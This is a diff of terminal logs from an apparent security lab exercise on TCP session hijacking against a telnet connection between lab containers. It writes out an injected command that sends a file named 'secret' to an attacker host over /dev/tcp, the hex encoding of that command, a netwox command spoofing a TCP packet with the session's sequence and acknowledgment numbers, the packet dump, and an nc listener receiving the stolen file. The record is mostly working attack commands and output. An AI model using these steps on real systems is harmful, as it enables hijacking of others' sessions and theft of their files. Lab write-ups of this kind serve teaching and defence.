@@ -1,44 +1,70 @@
+[02/17/22]admin@Attacker-vm:~/.../Labsetup$ python3
 Python 3.8.10 (default, Nov 26 2021, 20:14:08) 
 [GCC 9.3.0] on linux
 Type "help", "copyright", "credits" or "license" for more information.
 >>> import codecs
 >>> hexlify = codecs.getencoder('hex')
->>> hexlify(b'\r cat secret > /dev/tcp/10.9.0.1/9090 \r')[0]
-b'0d2063617420736563726574203e202f6465762f7463702f31302e392e302e312f39303930200d'
+>>> hexlify(b'\r cd /home/seed && cat secret > /dev/tcp/10.9.0.1/9090 \r')[0]
+b'0d206364202f686f6d652f736565642026262063617420736563726574203e202f6465762f7463702f31302e392e302e312f39303930200d'
 
-[02/13/22]admin@Attacker-vm:~/.../Task 4$ sudo netwox 40 --ip4-offsetfrag 0 --ip4-ttl 64 --ip4-protocol 6 --ip4-src 10.9.0.6 --ip4-dst 10.9.0.5 --tcp-src 59238 --tcp-dst 23 --tcp-seqnum 30030503 --tcp-acknum 636310665 --tcp-ack --tcp-psh --tcp-window 2000 --tcp-data '0d2063617420736563726574203e202f6465762f7463702f31302e392e302e312f39303930200d'
+root@b3925ccdb7e1:/# telnet 10.9.0.5
+Trying 10.9.0.5...
+Connected to 10.9.0.5.
+Escape character is '^]'.
+Ubuntu 20.04.1 LTS
+58a9ed39547c login: seed
+Password: 
+Welcome to Ubuntu 20.04.1 LTS (GNU/Linux 5.11.0-1029-gcp x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+This system has been minimized by removing packages and content that are
+not required on a system that users do not log into.
+
+To restore this content, you can run the 'unminimize' command.
+Last login: Thu Feb 17 04:32:06 UTC 2022 from user1-10.9.0.6.net-10.9.0.0 on pts/2
+
+[02/17/22]admin@Attacker-vm:~/.../Task 5$ sudo netwox 40 -l 10.9.0.6 -m 10.9.0.5 -o 46922 -p 23 -q 1944077983 -r 2772011518 --tcp-ack -E 2000 -H '0d206364202f686f6d652f736565642026262063617420736563726574203e202f6465762f7463702f31302e392e302e312f39303930200d'
 IP______________________________________________________________.
 |version|  ihl  |      tos      |            totlen             |
-|___4___|___5___|____0x00=0_____|___________0x004F=79___________|
+|___4___|___5___|____0x00=0_____|___________0x0060=96___________|
 |              id               |r|D|M|       offsetfrag        |
-|_________0xAD4C=44364__________|0|0|0|________0x0000=0_________|
+|_________0x62B5=25269__________|0|0|0|________0x0000=0_________|
 |      ttl      |   protocol    |           checksum            |
-|____0x40=64____|____0x06=6_____|____________0xB940_____________|
+|____0x00=0_____|____0x06=6_____|____________0x43C7_____________|
 |                            source                             |
 |___________________________10.9.0.6____________________________|
 |                          destination                          |
 |___________________________10.9.0.5____________________________|
 TCP_____________________________________________________________.
 |          source port          |       destination port        |
-|_________0xE766=59238__________|___________0x0017=23___________|
+|_________0xB74A=46922__________|___________0x0017=23___________|
 |                            seqnum                             |
-|______________________0x01CA3AA7=30030503______________________|
+|_____________________0x73E0469F=1944077983_____________________|
 |                            acknum                             |
-|_____________________0x25ED5489=636310665______________________|
+|_____________________0xA53989FE=2772011518_____________________|
 | doff  |r|r|r|r|C|E|U|A|P|R|S|F|            window             |
-|___5___|0|0|0|0|0|0|0|1|1|0|0|0|__________0x07D0=2000__________|
+|___5___|0|0|0|0|0|0|0|1|0|0|0|0|__________0x07D0=2000__________|
 |           checksum            |            urgptr             |
-|_________0x7C73=31859__________|___________0x0000=0____________|
-0d 20 63 61  74 20 73 65  63 72 65 74  20 3e 20 2f  # . cat secret > /
-64 65 76 2f  74 63 70 2f  31 30 2e 39  2e 30 2e 31  # dev/tcp/10.9.0.1
-2f 39 30 39  30 20 0d                               # /9090 .
+|_________0x8C83=35971__________|___________0x0000=0____________|
+0d 20 63 64  20 2f 68 6f  6d 65 2f 73  65 65 64 20  # . cd /home/seed 
+26 26 20 63  61 74 20 73  65 63 72 65  74 20 3e 20  # && cat secret > 
+2f 64 65 76  2f 74 63 70  2f 31 30 2e  39 2e 30 2e  # /dev/tcp/10.9.0.
+31 2f 39 30  39 30 20 0d                            # 1/9090 .
 
-root@58a9ed39547c:/# netstat -tna
+root@Attacker-vm:/volumes/Task 4# nc -l 9090
+This is a secret file.
+
+root@58a9ed39547c:/home/seed# netstat -tna
 Active Internet connections (servers and established)
 Proto Recv-Q Send-Q Local Address           Foreign Address         State      
-tcp        0      0 127.0.0.11:46613        0.0.0.0:*               LISTEN     
 tcp        0      0 0.0.0.0:23              0.0.0.0:*               LISTEN     
-tcp        0    170 10.9.0.5:23             10.9.0.6:59238          ESTABLISHED
-root@58a9ed39547c:/# ss -K dst 10.9.0.6 dport 59238
+tcp        0      0 127.0.0.11:32951        0.0.0.0:*               LISTEN     
+tcp        0    100 10.9.0.5:23             10.9.0.6:46922          ESTABLISHED
+root@58a9ed39547c:/home/seed# ss -K dst 10.9.0.6 dport 46922
 Netid State  Recv-Q  Send-Q   Local Address:Port     Peer Address:Port  Process 
-tcp   ESTAB  0       170           10.9.0.5:telnet       10.9.0.6:59238 
+tcp   ESTAB  0       100           10.9.0.5:telnet       10.9.0.6:46922   
+
+seed@58a9ed39547c:~$ Connection closed by foreign host.
